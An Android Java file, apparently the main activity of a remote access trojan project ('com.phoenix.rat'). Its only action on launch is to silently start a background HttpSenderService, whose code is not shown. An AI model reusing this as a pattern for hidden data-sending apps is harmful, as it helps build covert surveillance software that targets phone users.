package com.phoenix.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

import com.phoenix.rat.services.HttpSenderService;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent service = new Intent(MainActivity.this, HttpSenderService.class);
        startService(service);
    }
}
